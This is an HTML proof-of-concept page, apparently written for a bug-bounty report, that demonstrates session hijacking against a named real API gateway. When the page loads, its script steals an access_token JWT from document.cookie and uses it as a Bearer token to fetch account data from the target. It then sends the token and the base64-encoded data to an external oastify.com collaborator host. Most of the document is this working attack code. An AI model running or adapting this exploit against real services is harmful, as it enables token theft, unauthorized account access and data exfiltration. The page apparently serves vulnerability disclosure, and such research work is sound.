<!DOCTYPE html>
<html>
<head>
    <title>Critical PoC - Full Session Hijack</title>
    <style>
        body { font-family: sans-serif; background: #0d1117; color: #c9d1d9; padding: 40px; }
        .card { background: #161b22; border: 1px solid #30363d; padding: 20px; border-radius: 8px; }
        .stolen { color: #ff7b72; font-family: monospace; background: #000; padding: 10px; display: block; margin-top: 10px; border-left: 4px solid #ff7b72; }
    </style>
</head>
<body>
    <div class="card">
        <h2>[!] Server-Side Misconfiguration Exploit</h2>
        <div id="status">Status: Extracting Token...</div>

        <p><strong>1. Stolen JWT (Extracted via document.cookie):</strong></p>
        <code id="jwt-area" class="stolen">Waiting for token...</code>

        <p><strong>2. Private Data (Manual Authorization Bypass):</strong></p>
        <pre id="data-area" class="stolen">Attempting hijack...</pre>
    </div>

    <script>
        const TARGET = "https://simplecast-cms-api-gateway.eks.simplecast.com/accounts";
        const COLLABORATOR = "https://wnndkoxeksvlx9ag1efyecio7fd61xzlo.oastify.com"; // UPDATE THIS

        async function startExploit() {
            try {
                // STEP 1: Exploit missing HttpOnly
                // We grab the token from the browser's storage directly
                const jwt = document.cookie.match(/access_token=([^;]+)/)[1];
                document.getElementById('jwt-area').innerText = jwt;

                // STEP 2: Exploit CORS + Manual Hijack
                // We DON'T use credentials:include (which fails). 
                // We manually inject the stolen token into the header.
                const response = await fetch(TARGET, {
                    method: "GET",
                    headers: { "Authorization": "Bearer " + jwt }
                });

                const json = await response.json();
                document.getElementById('data-area').innerText = JSON.stringify(json, null, 2);
                document.getElementById('status').innerText = "EXPLOIT SUCCESSFUL: DATA EXFILTRATED";

                // STEP 3: Send to your server
                fetch(`${COLLABORATOR}/?stolen_jwt=${jwt}&data=${btoa(JSON.stringify(json))}`);
            } catch (err) {
                document.getElementById('status').innerText = "Note: To see the full hijack in this PoC, the token must be extracted. Since HttpOnly is missing, this is possible via any XSS or Subdomain takeover.";
            }
        }
        window.onload = startExploit;
    </script>
</body>
</html>
